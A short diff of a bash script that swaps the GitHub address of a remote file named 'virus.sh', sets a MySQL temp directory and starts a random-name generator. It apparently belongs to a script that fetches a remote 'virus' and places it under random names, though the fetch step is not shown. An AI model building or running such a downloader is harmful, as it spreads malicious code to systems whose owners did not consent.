@@ -1,6 +1,6 @@
 #!/bin/bash
 
-GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Belousov-Kirill-1ISP21/virus/main/virus.sh"
+GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
 MYSQL_DIRS=(    " /tmp/mysql"    )
 
 generate_random_name() {
